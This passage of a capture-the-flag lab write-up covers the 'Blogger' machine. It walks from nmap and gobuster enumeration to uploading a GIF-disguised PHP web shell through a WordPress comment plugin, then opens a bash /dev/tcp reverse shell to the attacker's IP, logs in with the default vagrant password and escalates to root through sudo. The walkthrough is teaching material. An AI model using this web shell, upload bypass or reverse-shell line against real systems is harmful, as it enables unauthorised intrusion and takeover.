</span></span><span style=display:flex><span>Uptime guess: 0.006 days <span style=color:#f92672>(</span>since Mon Sep <span style=color:#ae81ff>19</span> 21:46:10 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>259</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 22/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   55.69 ms 192.168.49.1 <span style=color:#f92672>(</span>192.168.49.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   52.86 ms 192.168.81.217 <span style=color:#f92672>(</span>192.168.81.217<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 21:54
</span></span><span style=display:flex><span>Completed NSE at 21:54, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:54
</span></span><span style=display:flex><span>Completed NSE at 21:54, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 21:54
</span></span><span style=display:flex><span>Completed NSE at 21:54, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 17.70 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>78</span> <span style=color:#f92672>(</span>5.316KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>42</span> <span style=color:#f92672>(</span>16.692KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Brute force the website for directories using <code>gobuster</code>.</p><ul><li>Command: <code>gobuster dir -u http://192.168.81.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ gobuster dir -u http://192.168.81.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:                     http://192.168.81.217/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:                  GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:                 <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Negative Status codes:   <span style=color:#ae81ff>404</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:              gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:                 10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/19 21:56:47 Starting gobuster in directory enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/assets               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 317<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://192.168.81.217/assets/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/css                  <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 314<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://192.168.81.217/css/<span style=color:#f92672>]</span>   
</span></span><span style=display:flex><span>/images               <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 317<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://192.168.81.217/images/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/js                   <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 313<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://192.168.81.217/js/<span style=color:#f92672>]</span>    
</span></span><span style=display:flex><span>/server-status        <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 279<span style=color:#f92672>]</span>                                    
</span></span><span style=display:flex><span>                                                                                   
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2022/09/19 22:00:56 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>The navigation on port <code>80</code> and <code>/assets</code> directory leads to the URL: <code>http://192.168.81.217/assets/fonts/blog/</code> which appears to be a blog not displaying correctly.<br>After hovering over most links, they lead to <code>blogger.thm</code> so in order for the blog to be displayed correctly we need to add the domain name and the IP address in <code>/etc/hosts</code> file.<br>Then, the operating system will translate the hostname <code>blogger.thm</code> to the IP <code>192.168.81.217</code>.<br>The contents of <code>/etc/hosts</code> should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ cat /etc/hosts
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>192.168.81.217  blogger.thm
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Now, navigate to <code>http://blogger.thm/assets/fonts/blog/</code> and the blog is displayed correctly.<br>It appears to be a <code>Wordpress</code> blog, so we could use the <code>wpscan</code> tool to enumerate for all plugins, all themes, config backups and Db exports, but no interesting results are shown.</p><ul><li>Command: <code>wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap,at,cb,dbe</code></li></ul><p>If we navigate to whichever post, we identify <code>Comment</code> functionality that can include the <code>attachment</code> of an image.<br>Create <code>cmd.php</code> with contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>GIF87a</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>system</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>]);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>Above the php code we have put the <code>magic bytes</code> of a GIF file according to: <a href=https://en.wikipedia.org/wiki/List_of_file_signatures>https://en.wikipedia.org/wiki/List_of_file_signatures</a>, in order for our file to be treated as a GIF file.<br>Then, we attach the <code>cmd.php</code>, open Burp Suite, turn Intercept to On, and click on <code>POST COMMENT</code>. Finally, click <code>Forward</code> on Burp Suite.<br>The request should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>POST /assets/fonts/blog/wp-admin/admin-ajax.php HTTP/1.1
</span></span><span style=display:flex><span>Host: blogger.thm
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>X-Requested-With: XMLHttpRequest
</span></span><span style=display:flex><span>Content-Type: multipart/form-data; boundary<span style=color:#f92672>=</span>---------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>1421</span>
</span></span><span style=display:flex><span>Origin: http://blogger.thm
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://blogger.thm/assets/fonts/blog/?p<span style=color:#f92672>=</span><span style=color:#ae81ff>29</span>
</span></span><span style=display:flex><span>Cookie: wpdiscuz_hide_bubble_hint<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;action&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>wpdAddComment
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wc_comment&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>test
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wmu_files[]&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\f</span>akepath<span style=color:#ae81ff>\c</span>md.php
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wmu_attachments&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;images&#34;</span>:<span style=color:#f92672>[</span>34<span style=color:#f92672>]}</span>
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wc_name&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>test
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wc_email&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>test@test.com
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wc_website&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>https://test.com
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Post Comment
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wpdiscuz_unique_id&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>0_0
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;wpd_comment_depth&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244
</span></span><span style=display:flex><span>Content-Disposition: form-data; name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;postId&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>
</span></span><span style=display:flex><span>-----------------------------5658711851211151532350158244--
</span></span></code></pre></div><p>The file <code>cmd.php</code> is successfully uploaded and in the Comments section we can a link for <code>cmd.php</code> which leads to: <code>http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php</code>.<br>At this point, we can execute code by navigating to: <code>http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=id</code><br>Output:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GIF87a uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> 
</span></span></code></pre></div><p>We are the user <code>www-data</code>, so now we want to get a reverse shell.<br>Intercept this request: <code>http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd=id</code> with Burp Suite, change it as shown below, click on <code>Forward</code> and open a netcat listener.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>GET /assets/fonts/blog/wp-content/uploads/2022/09/cmd-1663615798.9082.php?cmd<span style=color:#f92672>=</span>bash+-c+<span style=color:#e6db74>&#39;exec+bash+-i+%26&gt;/dev/tcp/192.168.49.81/443+&lt;%261&#39;</span> HTTP/1.1
</span></span><span style=display:flex><span>Host: blogger.thm
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>X11; Linux x86_64; rv:102.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/102.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Cookie: wpdiscuz_hide_bubble_hint<span style=color:#f92672>=</span>1; comment_author_email_f401df2453a4515e2d6a824db178db1a<span style=color:#f92672>=</span>test@test.com; comment_author_f401df2453a4515e2d6a824db178db1a<span style=color:#f92672>=</span>test; comment_author_url_f401df2453a4515e2d6a824db178db1a<span style=color:#f92672>=</span>https://test.com
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>Now we have a reverse shell as the <code>www-data</code> user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...                                                                               
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>192.168.49.81<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.81.217<span style=color:#f92672>]</span> <span style=color:#ae81ff>54292</span>                                         
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>1428<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device                           
</span></span><span style=display:flex><span>bash: no job control in this shell 
</span></span><span style=display:flex><span>&lt;ress/assets/fonts/blog/wp-content/uploads/2022/09$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>&lt;content/uploads/2022/09$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>     
</span></span><span style=display:flex><span>&lt;ress/assets/fonts/blog/wp-content/uploads/2022/09$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>geobour98@kali:~$ stty raw -echo;fg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + continued  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>&lt;content/uploads/2022/09$ export TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2022/09$ stty rows <span style=color:#ae81ff>38</span> cols <span style=color:#ae81ff>111</span>
</span></span><span style=display:flex><span>www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2022/09$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Navigate to <code>/home</code> and we see home folders of the users: <code>james</code>, <code>ubuntu</code> and <code>vagrant</code>.<br><code>Vagrant</code> is an open-source tool that allows you to create, configure, and manage boxes of virtual machines through an easy to use command interface.<br>There is also a default password: <code>vagrant</code> for root on the Vagrant tool. We can try that password for the <code>vagrant</code> user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@ubuntu-xenial:/home/vagrant$ su vagrant                                                         
</span></span><span style=display:flex><span>Password:                                                                                                
</span></span><span style=display:flex><span>vagrant@ubuntu-xenial:~$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>vagrant<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>vagrant<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>vagrant<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Now we are the user <code>vagrant</code> and can read the <code>local.txt</code> from <code>/home/james/</code> directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>vagrant@ubuntu-xenial:/home/james$ cat local.txt 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After executing the command: <code>sudo -l</code> we see that we can execute anything as <code>root</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>vagrant@ubuntu-xenial:/home/james$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> vagrant on ubuntu-xenial:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User vagrant may run the following commands on ubuntu-xenial:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: ALL
</span></span><span style=display:flex><span>vagrant@ubuntu-xenial:/home/james$ sudo -s
</span></span><span style=display:flex><span>root@ubuntu-xenial:/home/james# id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>root@ubuntu-xenial:/home/james# cd /root
</span></span><span style=display:flex><span>root@ubuntu-xenial:/root# cat proof.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>Proof of Concept (PoC image):
<img src=../../../pg/blogger/blogger.png alt="Blogger photo" style=width:700px;height:300px></p></div><footer class=post-footer><nav class=paginav><a class=prev href=https://geobour98.com/write-ups/thm/><span class=title>Â« Prev Page</span><br><span></span></a>
<a class=next href=https://geobour98.com/write-ups/pg/dc-4/><span class=title>Next Page Â»</span><br><span>Proving Grounds - DC-4</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>